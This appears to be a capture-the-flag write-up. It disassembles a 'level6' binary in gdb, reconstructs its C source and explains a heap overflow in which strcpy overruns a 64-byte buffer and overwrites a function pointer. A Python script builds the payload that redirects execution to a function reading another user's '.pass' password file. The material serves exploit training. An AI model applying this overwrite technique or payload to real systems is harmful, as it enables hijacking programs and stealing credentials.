Let's run `GDB`:
``` shell
$ gdb level6 
(gdb) set disassembly-flavor intel
(gdb) disas main
   0x0804847c <+0>:  push   ebp
   0x0804847d <+1>:  mov    ebp,esp
   0x0804847f <+3>:  and    esp,0xfffffff0
   0x08048482 <+6>:  sub    esp,0x20
   0x08048485 <+9>:  mov    DWORD PTR [esp],0x40
   0x0804848c <+16>: call   0x8048350 <malloc@plt>
   0x08048491 <+21>: mov    DWORD PTR [esp+0x1c],eax
   0x08048495 <+25>: mov    DWORD PTR [esp],0x4
   0x0804849c <+32>: call   0x8048350 <malloc@plt>
   0x080484a1 <+37>: mov    DWORD PTR [esp+0x18],eax
   0x080484a5 <+41>: mov    edx,0x8048468
   0x080484aa <+46>: mov    eax,DWORD PTR [esp+0x18]
   0x080484ae <+50>: mov    DWORD PTR [eax],edx
   0x080484b0 <+52>: mov    eax,DWORD PTR [ebp+0xc]
   0x080484b3 <+55>: add    eax,0x4
   0x080484b6 <+58>: mov    eax,DWORD PTR [eax]
   0x080484b8 <+60>: mov    edx,eax
   0x080484ba <+62>: mov    eax,DWORD PTR [esp+0x1c]
   0x080484be <+66>: mov    DWORD PTR [esp+0x4],edx
   0x080484c2 <+70>: mov    DWORD PTR [esp],eax
   0x080484c5 <+73>: call   0x8048340 <strcpy@plt>
   0x080484ca <+78>: mov    eax,DWORD PTR [esp+0x18]
   0x080484ce <+82>: mov    eax,DWORD PTR [eax]
   0x080484d0 <+84>: call   eax
   0x080484d2 <+86>: leave  
   0x080484d3 <+87>: ret 
```

Let's firstly dissassemble the function:
``` c
void n()
{
   system("/bin/cat /home/user/level7/.pass");
}

void m()
{
   puts("Nope");
}

typedef void (*t_func)();

int main(int argc, char **argv)
{
   char *str;
   t_func *func;

   str = malloc(64);
   func = malloc(sizeof(t_func));

   *func = m;
   strcpy(str, argv[1]);

   (*func)();

   return 0;
}
```

We have two variables.
I've called them `str` and `func`.
We sequentially allocate memory for them.
Then you use `str` for storing `argv[1]` and `func` for calling function `m`.

The exploit here is quite easy.
We control `argv[1]` and if we pass a string larger than 64 bytes, the memory will be overwritten.
More precisely a malloc's block for variable `func` will be overwritten.

We know that malloc uses 8 bytes for storing information about its blocks.

So, to overwrite value of `func` variable we need to pass string in following format:
`[64 bytes for str][8 bytes for malloc block][value for func]`

We can generate such strings with following script:
``` python
import struct

out = ''
out += '1' * (64 + 8)
out += struct.pack('I', 0x8048454)
out += '\x00'

print(out)
```

